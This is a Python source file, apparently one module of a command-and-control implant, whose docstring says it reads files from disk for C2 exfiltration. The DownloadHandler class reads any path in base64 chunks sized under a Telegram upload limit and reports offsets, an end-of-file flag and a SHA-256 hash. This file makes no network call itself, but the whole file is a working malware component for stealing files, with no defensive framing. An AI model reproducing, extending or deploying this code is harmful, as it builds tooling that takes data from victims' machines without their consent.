"""File download handler — reads file chunks from disk for C2 exfiltration."""
from __future__ import annotations
import base64
import hashlib
import os


class DownloadHandler:
    """Read file bytes from the local filesystem in chunks."""

    DEFAULT_CHUNK = 45 * 1024 * 1024  # 45 MB — under Telegram 50 MB limit

    def read_chunk(self, path: str, offset: int = 0, length: int = DEFAULT_CHUNK) -> dict:
        """
        Read up to `length` bytes from `path` starting at `offset`.

        Returns:
            {
              "status": "ok"|"error",
              "data": "<base64>",
              "offset": int,
              "chunk_size": int,
              "total_size": int,
              "sha256": "<hex of entire file>",   # only when offset==0
              "eof": bool,
            }
        """
        try:
            size = os.path.getsize(path)
        except OSError as exc:
            return {"status": "error", "output": str(exc)}

        try:
            with open(path, "rb") as fh:
                fh.seek(offset)
                chunk = fh.read(length)
        except OSError as exc:
            return {"status": "error", "output": str(exc)}

        result: dict = {
            "status":     "ok",
            "data":       base64.b64encode(chunk).decode("ascii"),
            "offset":     offset,
            "chunk_size": len(chunk),
            "total_size": size,
            "eof":        (offset + len(chunk)) >= size,
        }

        if offset == 0:
            result["sha256"] = self._sha256(path)

        return result

    def _sha256(self, path: str) -> str:
        h = hashlib.sha256()
        try:
            with open(path, "rb") as fh:
                for block in iter(lambda: fh.read(65536), b""):
                    h.update(block)
            return h.hexdigest()
        except OSError:
            return ""
